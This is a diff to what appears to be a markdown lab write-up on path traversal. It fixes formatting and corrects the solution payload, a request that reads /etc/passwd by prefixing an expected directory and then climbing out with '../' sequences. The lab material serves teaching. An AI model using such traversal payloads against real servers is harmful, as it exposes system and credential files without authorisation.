@@ -11,12 +11,12 @@ By cleverly manipulating the input, attackers can bypass this validation and acc
 
 - Craft payloads to trick the application’s path checks.
 
-- Access sensitive files like /etc/passwd.
+- Access sensitive files like `/etc/passwd`.
 
 ## Solution
 
 <img width="1366" height="389" alt="Screenshot (798)" src="https://github.com/user-attachments/assets/3cef913b-311d-433a-8905-e2bf18b899a8" />
 
 ```
-<img src="/images/filename=/var/www/images/../../../etc/passwd">
+<img src="/images?filename=/var/www/images/../../../etc/passwd">
 ```
